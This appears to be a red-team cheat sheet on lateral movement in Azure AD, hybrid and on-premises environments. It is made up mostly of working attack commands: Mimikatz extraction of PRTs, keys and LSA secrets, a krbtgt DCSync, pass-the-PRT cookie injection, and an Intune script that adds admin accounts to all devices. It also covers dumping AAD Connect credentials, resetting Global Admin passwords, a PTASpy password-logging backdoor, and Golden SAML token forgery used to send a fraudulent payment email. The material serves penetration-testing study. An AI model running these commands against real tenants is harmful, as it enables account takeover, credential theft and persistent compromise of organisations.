# Lateral movement

## Azure AD machine --> Azure (or another Azure AD Machine)
* [Pass the certificate](#Pass-the-certificate)
* [Pass the PRT](#Pass-the-PRT) 

* [General](#General)
  * [Access Tokens](#Access-Tokens)
* [Azure AD To On-premises](#Azure-AD-To-On-Premises)
  * [Intune](#Intune)
  * [Application proxy abuse](#Application-proxy-abuse)

## On-Prem --> Azure AD
* [Azure AD Connect](#Azure-AD-Connect)
  * [Password Hash Sync (PHS) Abuse](#Password-Hash-Sync-Abuse)
  * [Pass Through Authentication (PTA) Abuse](#Pass-Through-Authentication-Abuse)
  * [Federation (ADFS)](#Federation-ADFS)

## General
### Access Tokens
- The Identity Platform (Entra ID) uses thee types of bearer tokens.
	- ID Token - Contains basic information about the user
		- Expiry is 1 hour
	- Access token - Used to get access to a resource. Prone to token replay attacks.
		- Expiry ranges from 70 minutes to 24 hours depending on type
		- Can't be revoked.
	- Refresh token - Can be used to request new access and ID Tokens.
		- Expiry is 90 days for inactive tokens, no expiry for active tokens.

#### Decode access token
- https://jwt.io
- You can get a lot of information about the access token such as the user, scope 
	- the provenance of the token (`iss`)
	- the resource owner and client application (`oid`/`upn`, `appid`)
	- the authorized scopes (`scp`)
	- the issuance and expiration times (`iat`, `exp`)
	- the resource server (`aud`)
	- the authentication methods that the resource owner used to authorize the client application (`amr`)

### Request access tokens
#### Using AZ Module
- Requires a refresh token or normal login

```
$AADGraphToken = (Get-AzAccessToken -ResourceTypeName AadGraph).Token

$ARMAccessToken = (Get-AzAccessToken -ResourceTypeName Arm).Token

$StorageAccessToken = (Get-AzAccessToken -ResourceTypeName Storage).Token

$KeyVault (Get-AzAccessToken -ResourceTypeName Storage).Token
```

### TokenTactics
- Using Refresh token, `$tokens` variable from TokenTactics

```
$GraphAccessToken = (Invoke-RefreshToMSGraphToken -domain <DOMAIN>.onmicrosoft.com -refreshToken $tokens.refresh_token).access_token

$ARMAccessToken = (Invoke-RefreshToAzureManagementToken -domain <COMPANY>.onmicrosoft.com -refreshToken $response.refresh_token).access_token
```

### Stealing access tokens
- [Link to Post-Exploitation](../post-exploitation.md#Stealing-tokens)

## Azure AD To On Premises
### Pass the certificate
- To go from Azure AD machine to other Azure AD machine if the user has administrative access to other machines.

#### Check if machine is Azure AD Joined
- Check for IsDeviceJoined : YES
```
dsregcmd /status
```

#### Extract PRT, Session key (keyvalue) and Tenant ID
```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
```

#### Extract context key, clearkey and derived key
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
```

#### Request a certificate from PRT
- https://github.com/morRubin/PrtToCert
- Code is modified in the lab
```
& 'C:\Program Files\Python39\python.exe' RequestCert.py --tenantId <TENANT ID> --prt <PRT VALUE> --userName <USERNAME> --hexCtx <CONTEXT KEY VALUE> --hexDerivedKey <DERIVED KEY VALUE>
```

#### Use certificate to add a user with administrative privileges
- Code is modified in the lab
- https://github.com/morRubin/AzureADJoinedMachinePTC
```
python \AzureADJoinedMachinePTC\Main.py --usercert <PATH TO .pfx FILE> --certpass AzureADCert --remoteip <TARGET IP> --command "cmd.exe /c net user <USERNAME> <PASSWORD> /add /Y && net localgroup administrators <USERNAME> /add"
```

#### Use psremoting to access the machine

### Pass the PRT
- PRT is a special refresh token used for single sign-on (SSO)!
  – It can be used to obtain access and refresh tokens to any application.
  – Issued to a user for a specific device
  – Valid for 90 days and is continuously renewed
  – CloudAP SSP requests and caches PRT on a device
  – If PRT is MFA-based (Windows Hello or Windows Account manager), then the claim is transferred to app tokens to prevent MFA challenge for every application.
  - If we compromise an Azure AD joined (or Hybrid joined) machine, it is possible to extract PRT and other keys for a user.
  - For Azure AD Registered machine, PRT is issued if a user has added a secondary work account to the device.
  - Before a fix in August 2021, PRT always had MFA claims. After fixes in August 2021, PRT can currently be extracted only for the current Azure AD user (not as a local admin or any other user).
  - If we have access to a PRT, it is possible to request access tokens for any application.
  - Chrome uses BrowserCore.exe to use PRT and request PRT cookie for SSO experience.
  - This PRT cookie - x-ms-RefreshTokenCredential – can be used in a browser to access any application as the user whose PRT we have.

#### Request a nonce
```
$TenantId = "<TENANT>"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI" = $URL
"Method" = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```

#### Extract PRT
- Should be run on session of the targer Azure AD User
- https://github.com/dirkjanm/ROADtools
- https://aadinternals.com/aadinternals/
```
C:\AzAD\Tools\ROADToken.exe <nonce>
Get-AADIntUserPRTToken
````

#### Copy the value from above command and use it with a web browser
- Open the Browser in Incognito mode
- Go to https://login.microsoftonline.com/login.srf
- Press F12 (Chrome dev tools) -> Application -> Cookies
- Clear all cookies and then add one named `x-ms-RefreshTokenCredential` for https://login.microsoftonline.com and set its value to that retrieved from AADInternals
- Mark HTTPOnly and Secure for the cookie
- Visit https://login.microsoftonline.com/login.srf again and we will get access as the user!
- Can now also access portal.azure.com

## Intune
- a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
- If user had Intune Administrator role go to https://endpoint.microsoft.com/#home and login (or from a ticket (PRT)
- Go to Devices -> All Devices to check devices enrolled to Intune:
- Go to Scripts and Click on Add for Windows 10. Create a new script and select a script
- Example script adduser.ps1

```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
New-LocalUser -Name <USERNAME> -Password $passwd
Add-LocalGroupMember -Group Administrators -Member <USERNAME>
```

- Select `Run script in 64 bit PowerShell Host`
- On the assignment page select "Add all users" and "add all devices"

## Application proxy abuse
- The application behind the proxy may have vulnerabilities to access the on-prem environment.
#### Enumerate application which has a application proxy configured
```
Import-Module .\AzureAD.psd1
Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
```

#### Get the Service Principal (use the application name)
```
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "<APPLICATION NAME>"} 
```

#### Find user and groups assigned to the application
```
. .\Get-ApplicationProxyAssignedUsersAndGroups.ps1
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT ID OF SERVICE PRINCIPAL>
```

#### Extract secrets of service account
- After compromising the application
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

# On-Prem --> Azure AD
- https://aadinternals.com/post/on-prem_admin/

## Azure AD Connect
- When Azure AD Connect is configured. The `SYNC_` account and `MSOL_` account are created. (or `AAD_` if installed on a DC)
- The `SYNC_` account has the role `Directory Synchronization Accounts` and can reset any password within the cloud and the `MSOL_` and `AAD_` account have DCSync rights.
- The role is now shown in the Azure portal [Documentation](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#roles-not-shown-in-the-portal)
- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.
- A lot of the attacks uses https://github.com/Gerenios/AADInternals

#### Enumerate server where Azure AD connect is installed (on prem command)
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
```

#### Enumerate server where Azure AD connect is installed (Azure command)
```
Import-Module .\AzureAD.psd1
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

#### Check if AD Connect is installed on the server
```
Get-ADSyncConnector
```

#### Dumping AAD Connect credentials
- If it fails check if the service is running
```
Import-Module .\AADInternals.psd1
Get-AADIntSyncCredentials
```

- Or use https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c#file-azuread_decrypt_msol_v2-ps1
```
powershell.exe -f C:\users\public\azuread_decrypt_msol_v2.ps1
```

#### Error
- If the error `[!] Could not connect to localdb...` shows. Change the SQL Instance name
```
Import-Module "C:\Program Files\Microsoft Azure AD Sync\Bin\ADSync\ADSync.psd1"
Get-ADSyncDatabaseConfiguration
```
- Edit line 4 of the script

## Password Hash Sync Abuse
#### Turn on password hash sync
- AAD Connect service account can turn on Password hash sync
```
Set-AADIntPasswordHashSyncEnabled -Enabled $true
```

### Abusing On-Prem MSOL_ Account
#### Run DCSync with creds of MSOL_* account
```
runas /netonly /user:<DOMAIN>\MSOL_<ID> cmd 
Invoke-Mimikatz -Command '"lsadump::dcsync/user:<DOMAIN>\krbtgt /domain:<DOMAIN> /dc:<DC NAME>"'
```

### Reset password of cloud user
- Using the Sync_* account we can reset password for any user. (Including Global Administrator and the user who created the tenant)

#### Using the creds, request an access token for AADGraph and save it to cache using the SYNC account.
```
Import-Module .\AADInternals.psd1
$passwd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<SYNC USERNAME>", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

#### Enumerate global admin
```
Get-AADIntGlobalAdmins
```

#### Get the ImmutableID
```
Get-AADIntUser -UserPrincipalName <NAME> | select ImmutableId
Get-AADIntUsers | Select UserPrincipalName,ImmutableId,ObjectId | Sort UserPrincipalName
```

#### Reset the Azure password
```
Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE ID>" -Password "<PASSWORD>" -Verbose
```

#### Reset password for cloud only user
- Need CloudAnchor ID which is the format ```<USER>_<OBJECTID>```
- Might be fixed already!
```
Import-Module .\AADInternals.psd1
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
```

- Access Azure portal using the new password.

## Pass Through Authentication PTA Abuse
- Once we have admin access to an Azure AD connect server running PTA agent.
- Not reliable method to check if PTA is used, Check if module is available ```Get-Command -Module PassthroughAuthPSModule```
- Once the backdoor is installed, we can authenticate as any user synced from on-prem without knowing the correct password!

#### Install a backdoor (needs to be run as administrator)
- Creates a hidden folder `C:\PTASpy` and Copies a `PTASpy.dll` to `C:\PTASpy` and Injects `PTASpy.dll` to AzureADConnectAuthenticationAgentService process
```
Import-Module .\AADInternals.psd1
Install-AADIntPTASpy
```

### See passwords of on-prem users authenticating
- Stored in `C:\PTASpy`
```
Import-Module .\AADInternals.psd1
Get-AADIntPTASpyLog
Get-AADIntPTASpyLog -DecodePasswords
```

#### Register a new PTA agent for persistence
- After getting Global Administrator privileges by setting it on a attacker controled machine.
```
Import-Module .\AADInternals.psd1
Install-AADIntPTASpy
```

## Federation-ADFS
- ADFS = Active Directory Federation Services
- Golden SAML Attack

#### Get the ImmutableID
```
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
```

#### Get the AD FS identifier issuer:
```
Get-AdfsProperties | select identifier
```

#### Can check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
```
Get-MsolDomainFederationSettings -DomainName <DOMAIN> | select IssuerUri
```

#### Extract the ADFS token signing certificate
- If no file name is given, the certificate is exported to the current directory as ADFSSigningCertificate.pfx with empty pfx password.
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Access cloud apps as any user
```
Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <ISSUER> -PfxFileName <PATH TO ADFSSigningCertificate.pfx> -Verbose
```

#### Create SAML Token
```
$saml=New-AADIntSAMLToken -ImmutableID <IMMUTABLE ID> -PfxFileName <PATH TO ADFSSigningCertificate.pfx> -PfxPassword "" -Issuer <ISSUER>
```

#### Get OAUTH access token used with AADInternal functions
```
$at=Get-AADIntAccessTokenForEXO -SAMLToken $saml
```

#### Send a message using "Outlook"
```
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```

### Creating tokens for cloud-only users
#### Create a realistic ImmutableID
```
$ImmutableID = [System.Convert]::ToBase64String((New-Guid).tobytearray())
```

#### Set ImmutableID
```
Set-AADIntAzureADObject -CloudAnchor "User_7b0ad665-a751-43d7-bb9a-7b8b1e6b1c59" -SourceAnchor $ImmutableID
```

#### Export the token signing certificate
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified 
```
Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <ISSUER> -PfxFileName <PATH TO ADFSSigningCertificate.pfx> -Verbose
```
